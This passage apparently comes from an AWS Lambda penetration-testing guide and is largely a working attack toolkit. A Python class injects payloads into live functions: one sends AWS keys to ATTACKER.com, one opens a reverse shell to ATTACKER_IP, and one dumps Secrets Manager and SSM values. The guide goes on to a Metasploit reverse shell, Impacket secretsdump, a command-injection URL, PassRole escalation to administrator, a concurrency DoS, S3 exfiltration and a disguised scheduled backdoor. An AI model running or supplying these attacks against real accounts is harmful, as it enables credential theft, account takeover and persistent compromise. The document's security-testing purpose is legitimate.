            self.lambda_client.list_functions(MaxItems=1)
            paths.append("lambda:ListFunctions ✓")
        except:
            pass
        
        # Check if we can create functions
        try:
            # Dry run - try to create function with invalid config
            self.lambda_client.create_function(
                FunctionName='test-privesc-check-' + str(int(datetime.now().timestamp())),
                Runtime='python3.9',
                Role='arn:aws:iam::000000000000:role/fake',
                Handler='handler.handler',
                Code={'ZipFile': b'fake'}
            )
        except self.lambda_client.exceptions.InvalidParameterValueException:
            # Permission exists but role is invalid
            paths.append("[PRIVESC] lambda:CreateFunction ✓")
            print("    [!!!] Can create Lambda functions!")
        except Exception as e:
            if 'AccessDenied' not in str(e):
                paths.append("[PRIVESC] lambda:CreateFunction ✓ (possible)")
        
        # Check if we can update function code
        for func in self.results.get('functions', []):
            try:
                # Don't actually update - just check permission
                self.lambda_client.get_function(FunctionName=func['name'])
                paths.append(f"[PRIVESC] Can access function: {func['name']}")
            except:
                pass
        
        # Check iam:PassRole
        try:
            roles = self.iam_client.list_roles(MaxItems=5)
            paths.append("iam:ListRoles ✓")
        except:
            pass
        
        for path in paths:
            print(f"    {path}")
        
        return paths
    
    def attempt_code_injection(self, function_name, payload_type='cred_steal'):
        """Attempt to inject code into a Lambda function"""
        print(f"\n[*] Attempting code injection on: {function_name}")
        
        payloads = {
            'cred_steal': '''
import os, json, urllib.request

_original_handler = None

def handler(event, context):
    creds = json.dumps({
        'key': os.environ.get('AWS_ACCESS_KEY_ID'),
        'secret': os.environ.get('AWS_SECRET_ACCESS_KEY'),
        'token': os.environ.get('AWS_SESSION_TOKEN'),
        'function': os.environ.get('AWS_LAMBDA_FUNCTION_NAME')
    }).encode()
    
    try:
        req = urllib.request.Request(
            'https://ATTACKER.com/steal',
            data=creds,
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req, timeout=3)
    except: pass
    
    return {'statusCode': 200, 'body': json.dumps(json.loads(creds.decode()))}
''',
            'reverse_shell': '''
import socket, subprocess, os, json

def handler(event, context):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("ATTACKER_IP", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
    return {'statusCode': 200}
''',
            'data_dump': '''
import boto3, json, os

def handler(event, context):
    results = {}
    
    # Dump secrets
    try:
        sm = boto3.client('secretsmanager')
        for secret in sm.list_secrets()['SecretList']:
            val = sm.get_secret_value(SecretId=secret['Name'])
            results[f"secret:{secret['Name']}"] = val.get('SecretString', 'binary')
    except: pass
    
    # Dump SSM parameters
    try:
        ssm = boto3.client('ssm')
        params = ssm.get_parameters_by_path(Path='/', Recursive=True, WithDecryption=True)
        for p in params['Parameters']:
            results[f"ssm:{p['Name']}"] = p['Value']
    except: pass
    
    # Dump env vars
    results['env'] = dict(os.environ)
    
    return {'statusCode': 200, 'body': json.dumps(results, default=str)}
'''
        }
        
        code = payloads.get(payload_type, payloads['cred_steal'])
        
        # Create zip
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            zf.writestr('handler.py', code)
        
        try:
            # Update function code
            self.lambda_client.update_function_code(
                FunctionName=function_name,
                ZipFile=zip_buffer.getvalue()
            )
            print(f"    [+] Code injected successfully!")
            
            # Wait for update
            import time
            time.sleep(3)
            
            # Invoke
            response = self.lambda_client.invoke(
                FunctionName=function_name,
                InvocationType='RequestResponse'
            )
            
            result = json.loads(response['Payload'].read())
            print(f"    [+] Invocation result: {json.dumps(result, indent=2)[:500]}")
            
            return result
            
        except Exception as e:
            print(f"    [-] Injection failed: {e}")
            return None
    
    # ==========================================
    # REPORTING
    # ==========================================
    
    def generate_report(self):
        """Generate comprehensive pentest report"""
        print(f"\n[*] Generating report...")
        
        report = {
            'metadata': {
                'timestamp': datetime.now().isoformat(),
                'account_id': self.account_id,
                'identity': self.identity['Arn'],
                'region': self.region
            },
            'summary': {
                'total_functions': len(self.results['functions']),
                'total_vulnerabilities': len(self.results['vulnerabilities']),
                'critical_findings': len([v for v in self.results['vulnerabilities'] if v.get('severity') == 'CRITICAL']),
                'high_findings': len([v for v in self.results['vulnerabilities'] if v.get('severity') == 'HIGH']),
                'secrets_found': len(self.results['secrets_found']),
                'escalation_paths': len(self.results['escalation_paths']),
                'attack_surface': len(self.results['attack_surface'])
            },
            'vulnerabilities': self.results['vulnerabilities'],
            'secrets': self.results['secrets_found'],
            'escalation_paths': self.results['escalation_paths'],
            'attack_surface': self.results['attack_surface'],
            'functions': self.results['functions']
        }
        
        # Save JSON report
        report_path = f"{self.output_dir}/report.json"
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        # Print summary
        print(f"\n{'='*60}")
        print(f"  LAMBDA PENTEST REPORT")
        print(f"{'='*60}")
        print(f"  Account:          {self.account_id}")
        print(f"  Functions Found:  {report['summary']['total_functions']}")
        print(f"  Vulnerabilities:  {report['summary']['total_vulnerabilities']}")
        print(f"    CRITICAL:       {report['summary']['critical_findings']}")
        print(f"    HIGH:           {report['summary']['high_findings']}")
        print(f"  Secrets Found:    {report['summary']['secrets_found']}")
        print(f"  Privesc Paths:    {report['summary']['escalation_paths']}")
        print(f"  Attack Surface:   {report['summary']['attack_surface']}")
        print(f"{'='*60}")
        
        if report['summary']['critical_findings'] > 0:
            print(f"\n  [!!!] CRITICAL FINDINGS:")
            for v in self.results['vulnerabilities']:
                if v.get('severity') == 'CRITICAL':
                    print(f"    • [{v['type']}] {v.get('function', 'N/A')}: {v.get('detail', v.get('key', ''))}")
        
        print(f"\n  Report saved: {report_path}")
        print(f"  Code saved:   {self.output_dir}/code/")
        
        return report
    
    def run_full_pentest(self):
        """Execute complete pentest workflow"""
        self.banner()
        self.enum_functions()
        self.check_privesc()
        return self.generate_report()


if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Lambda Pentest Automation')
    parser.add_argument('--profile', help='AWS profile name')
    parser.add_argument('--region', help='AWS region', default='us-east-1')
    parser.add_argument('--access-key', help='AWS Access Key ID')
    parser.add_argument('--secret-key', help='AWS Secret Access Key')
    parser.add_argument('--session-token', help='AWS Session Token')
    parser.add_argument('--inject', help='Function name to inject code into')
    parser.add_argument('--payload', help='Payload type: cred_steal, reverse_shell, data_dump', default='cred_steal')
    
    args = parser.parse_args()
    
    attacker = LambdaAttacker(
        profile=args.profile,
        region=args.region,
        access_key=args.access_key,
        secret_key=args.secret_key,
        session_token=args.session_token
    )
    
    if args.inject:
        attacker.attempt_code_injection(args.inject, args.payload)
    else:
        attacker.run_full_pentest()
```

---

## Additional Pentest Tools & Methods

### LambdaGuard — Automated Scanner

```bash [LambdaGuard]
# Install
pip3 install lambdaguard

# Run security scan
lambdaguard \
  --profile target-profile \
  --region us-east-1 \
  --output ./lambdaguard-report

# LambdaGuard checks:
# ✓ Function public access
# ✓ Environment variable secrets
# ✓ Over-privileged execution roles
# ✓ Deprecated runtimes
# ✓ VPC configuration
# ✓ Resource-based policies
# ✓ Tracing configuration
# ✓ Dead letter queue configuration
# ✓ Code signing

# View HTML report
firefox ./lambdaguard-report/report.html
```

### WeirdAAL — Lambda-Specific Modules

```bash [WeirdAAL Lambda]
cd /opt/weirdAAL

# Configure credentials
cat > .env << 'EOF'
[default]
aws_access_key_id = AKIAXXXXXXXXXXXXXXXX
aws_secret_access_key = XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
aws_session_token = XXXXXXXXXXXXXXXX
EOF

# Run Lambda-specific recon
python3 weirdAAL.py -m lambda_enum -t target
python3 weirdAAL.py -m lambda_get_function -t target

# Run full recon
python3 weirdAAL.py -m recon_all -t target

# Specific service modules
python3 weirdAAL.py -m s3_enum -t target
python3 weirdAAL.py -m iam_enum -t target
python3 weirdAAL.py -m ec2_enum -t target
```

### AWS CLI Advanced Lambda Operations

```bash [Advanced AWS CLI]
# ============================================
# LAMBDA ALIASES & VERSIONS
# ============================================

# List function versions (find old, potentially vulnerable versions)
aws lambda list-versions-by-function --function-name target-function

# List aliases
aws lambda list-aliases --function-name target-function

# Invoke specific version (old versions may have different code/permissions)
aws lambda invoke \
  --function-name target-function \
  --qualifier 1 \
  /tmp/old-version-output.json

# ============================================
# LAMBDA CONCURRENCY ABUSE
# ============================================

# Check reserved concurrency
aws lambda get-function-concurrency --function-name target-function

# Set reserved concurrency to 0 (DoS — disables function!)
aws lambda put-function-concurrency \
  --function-name target-function \
  --reserved-concurrent-executions 0

# Remove concurrency limit (restore)
aws lambda delete-function-concurrency \
  --function-name target-function

# ============================================
# LAMBDA TAGS (Information Disclosure)
# ============================================

# List tags (may contain environment info, owner, team)
aws lambda list-tags \
  --resource arn:aws:lambda:us-east-1:123456789012:function:target-function

# ============================================
# CLOUDWATCH LOGS (Function Output)
# ============================================

# List log groups for Lambda
aws logs describe-log-groups \
  --log-group-name-prefix '/aws/lambda/' \
  --query 'logGroups[*].logGroupName'

# Get latest log events (may contain secrets, errors, stack traces)
aws logs get-log-events \
  --log-group-name "/aws/lambda/target-function" \
  --log-stream-name "$(aws logs describe-log-streams \
    --log-group-name '/aws/lambda/target-function' \
    --order-by LastEventTime --descending \
    --limit 1 --query 'logStreams[0].logStreamName' --output text)"

# Search logs for secrets
aws logs filter-log-events \
  --log-group-name "/aws/lambda/target-function" \
  --filter-pattern "password OR secret OR key OR token OR error OR exception OR traceback" \
  --limit 100

# Dump ALL Lambda logs
for func in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
  echo "=== $func ==="
  aws logs filter-log-events \
    --log-group-name "/aws/lambda/$func" \
    --filter-pattern "password OR secret OR AKIA OR error" \
    --limit 20 2>/dev/null | jq -r '.events[].message' 2>/dev/null
done

# ============================================
# X-RAY TRACES (Request Tracing)
# ============================================

# Get traces (reveals function flow, downstream calls, timings)
aws xray get-trace-summaries \
  --start-time $(date -d '1 hour ago' +%s) \
  --end-time $(date +%s)

# Get specific trace details
aws xray batch-get-traces --trace-ids "1-xxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxx"
```

### Metasploit AWS Modules

```bash [Metasploit]
# Start Metasploit
msfconsole

# AWS-related modules
msf6 > search aws
msf6 > search cloud
msf6 > search lambda

# Key modules:
# auxiliary/cloud/aws/enum_iam
# auxiliary/cloud/aws/enum_ec2
# auxiliary/cloud/aws/enum_s3

# Use IAM enumeration
msf6 > use auxiliary/cloud/aws/enum_iam
msf6 auxiliary(cloud/aws/enum_iam) > set ACCESS_KEY_ID AKIAXXXXXXXX
msf6 auxiliary(cloud/aws/enum_iam) > set SECRET_ACCESS_KEY XXXXXXXX
msf6 auxiliary(cloud/aws/enum_iam) > run

# After getting Lambda RCE, generate payload for reverse shell
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST ATTACKER_IP
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run

# Generate Python payload for Lambda injection
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 -f raw > /tmp/lambda_shell.py
```

### Impacket for Post-Exploitation

```bash [Impacket — Post Lambda Pivot]
# After pivoting from Lambda to internal network via VPC

# If you find Windows hosts on the internal network
# Use Impacket for SMB/WMI/DCOM attacks

# PSExec
impacket-psexec target-domain/admin:Password123@10.0.1.50

# WMIExec
impacket-wmiexec target-domain/admin:Password123@10.0.1.50

# SMBClient
impacket-smbclient target-domain/admin:Password123@10.0.1.50

# SecretsDump (extract hashes)
impacket-secretsdump target-domain/admin:Password123@10.0.1.50

# If you have NTLM hashes
impacket-psexec -hashes :NTLM_HASH target-domain/admin@10.0.1.50
```

---

## Real-World Attack Scenarios

### Scenario 1 — External Attacker → Full Account Compromise

::steps{level="4"}

#### Discover API Gateway endpoint via JavaScript files

```bash [Step 1]
# Found: https://abc123.execute-api.us-east-1.amazonaws.com/prod/
curl -s https://target.com/static/js/main.js | \
  grep -oP 'https://[a-z0-9]+\.execute-api\.[a-z0-9-]+\.amazonaws\.com/[a-zA-Z0-9/_-]+'
```

#### Fuzz API endpoints and find SQL injection

```bash [Step 2]
ffuf -u "https://abc123.execute-api.us-east-1.amazonaws.com/prod/api/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,301,403

# Found: /api/users?id=
sqlmap -u "https://abc123.execute-api.us-east-1.amazonaws.com/prod/api/users?id=1" \
  --batch --dbs
```

#### Exploit SQL injection to read Lambda environment variables

```bash [Step 3]
# Through SQL injection, inject Python code that reads env vars
# OR find that the Lambda connects to RDS with credentials from env vars
# Extract the database credentials via SQLi
sqlmap -u "https://abc123.../prod/api/users?id=1" \
  --batch --sql-query "SELECT @@version"
```

#### Discover command injection in another endpoint

```bash [Step 4]
# Found /api/export?format=pdf
curl "https://abc123.../prod/api/export?format=pdf;env"
# Returns all environment variables including:
# AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXXX
# AWS_SECRET_ACCESS_KEY=XXXXXXXXXXXXXXXX
# AWS_SESSION_TOKEN=XXXXXXXXXXXXXXXX
```

#### Use stolen Lambda credentials for enumeration

```bash [Step 5]
export AWS_ACCESS_KEY_ID="ASIAXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="XXXXXXXXXXXXXXXX"
export AWS_SESSION_TOKEN="XXXXXXXXXXXXXXXX"

aws sts get-caller-identity
# Shows Lambda execution role

# Enumerate what this role can do
python3 /opt/enumerate-iam/enumerate-iam.py \
  --access-key $AWS_ACCESS_KEY_ID \
  --secret-key $AWS_SECRET_ACCESS_KEY \
  --session-token $AWS_SESSION_TOKEN
```

#### Escalate privileges via Lambda role

```bash [Step 6]
# Role has iam:PassRole + lambda:CreateFunction
# Create admin function

cat > /tmp/admin.py << 'EOF'
import boto3, json
def handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='deploy-user',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return {'status': 'escalated'}
EOF

zip /tmp/admin.zip /tmp/admin.py

aws lambda create-function \
  --function-name temp-admin \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/AdminRole \
  --handler admin.handler \
  --zip-file fileb:///tmp/admin.zip

aws lambda invoke --function-name temp-admin /tmp/result.json
```

#### Full account compromise achieved

```bash [Step 7]
# Now have admin access
aws iam list-users
aws s3 ls
aws secretsmanager list-secrets
aws rds describe-db-instances

# Exfiltrate data
aws s3 sync s3://production-data ./loot/
aws secretsmanager get-secret-value --secret-id prod/master-key
```

::

### Scenario 2 — Insider Threat / Compromised Developer Credentials

::steps{level="4"}

#### Start with developer's AWS credentials

```bash [Step 1]
# Developer credentials obtained via phishing/credential stuffing
aws sts get-caller-identity
# arn:aws:iam::123456789012:user/developer-john
```

#### Enumerate Lambda functions and download code

```bash [Step 2]
python3 lambda_attacker.py --profile stolen-dev --region us-east-1
# Downloads all function code, analyzes roles, finds secrets
```

#### Find hardcoded secrets in function code

```bash [Step 3]
grep -rn "password\|secret\|key" ./lambda-pentest-*/code/
# Found: payment-processor/handler.py contains Stripe API key
# Found: user-auth/config.py contains JWT signing secret
```

#### Modify function to create persistence

```bash [Step 4]
# Update payment-processor function to also send data to attacker
aws lambda update-function-code \
  --function-name payment-processor \
  --zip-file fileb://backdoored-payment.zip
```

#### Create hidden backdoor function

```bash [Step 5]
aws lambda create-function \
  --function-name CloudWatch-MetricCollector \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/payment-processor-role \
  --handler backdoor.handler \
  --zip-file fileb://backdoor.zip

# Schedule it
aws events put-rule --name metrics-collection --schedule-expression "rate(4 hours)"
aws events put-targets --rule metrics-collection \
  --targets '[{"Id":"1","Arn":"arn:aws:lambda:us-east-1:123456789012:function:CloudWatch-MetricCollector"}]'
```

::

---

## Post-Engagement Cleanup

::caution
**Always clean up** after an authorized pentest. Remove all backdoors, test functions, and modified configurations. Document every change made.
::

```bash [Cleanup Script]
#!/bin/bash
# cleanup.sh — Remove all pentest artifacts

echo "[*] Starting cleanup..."

# Remove test/backdoor functions
for func in "privesc-func" "network-scanner" "CloudWatch-MetricCollector" "temp-admin"; do
  echo "[*] Deleting function: $func"
  aws lambda delete-function --function-name "$func" 2>/dev/null
done

# Remove test layers
for layer in "telemetry-agent-v2" "python-common-utils" "nodejs-monitoring" "monitoring-extension"; do
  echo "[*] Deleting layer: $layer"
  versions=$(aws lambda list-layer-versions --layer-name "$layer" --query 'LayerVersions[*].Version' --output text 2>/dev/null)
  for v in $versions; do
    aws lambda delete-layer-version --layer-name "$layer" --version-number $v 2>/dev/null
  done
done

# Remove EventBridge rules
for rule in "system-health-check" "metrics-collection"; do
  echo "[*] Removing rule: $rule"
  aws events remove-targets --rule "$rule" --ids "1" 2>/dev/null
  aws events delete-rule --name "$rule" 2>/dev/null
done

# Restore modified functions (from backup)
# aws lambda update-function-code --function-name MODIFIED_FUNC --zip-file fileb://backup.zip

# Remove test IAM resources
aws iam delete-user --user-name "backup-service" 2>/dev/null
aws iam delete-role --role-name "backdoor-role" 2>/dev/null

# Remove test event source mappings
for uuid in $(aws lambda list-event-source-mappings --query 'EventSourceMappings[?contains(FunctionArn, `exfiltration-function`)].UUID' --output text 2>/dev/null); do
  aws lambda delete-event-source-mapping --uuid "$uuid" 2>/dev/null
done

echo "[+] Cleanup complete!"
echo "[!] Verify all changes manually and document in report."
```

---

::field-group

  :::field{name="Total Tools Covered" type="number"}
  **20+** — Pacu, ScoutSuite, Prowler, CloudFox, enumerate-iam, WeirdAAL, LambdaGuard, Burp Suite, ffuf, Gobuster, Nuclei, SQLMap, Nmap, Metasploit, Impacket, TruffleHog, GitLeaks, ROADtools, CloudMapper, custom scripts
  :::

  :::field{name="Attack Techniques" type="number"}
  **35+** — SQLi, CMDi, SSRF, XXE, Deserialization, Prototype Pollution, Env Var Injection, Layer Poisoning, Extension Injection, Role Abuse, PassRole, S3 Trigger Poisoning, SQS Injection, DynamoDB Poisoning, Cross-Account Pivoting, VPC Network Scanning, DNS Exfiltration, CloudTrail Evasion, and more
  :::

  :::field{name="Platforms" type="string"}
  AWS Lambda, API Gateway (REST & HTTP), S3, DynamoDB, SQS, SNS, EventBridge, Secrets Manager, SSM, RDS, EC2 (pivot), VPC internal networks
  :::

::

::tip
This guide is a **living document**. Update it with new techniques, tools, and findings from each engagement. Always verify tool compatibility with the latest AWS API changes before use.
::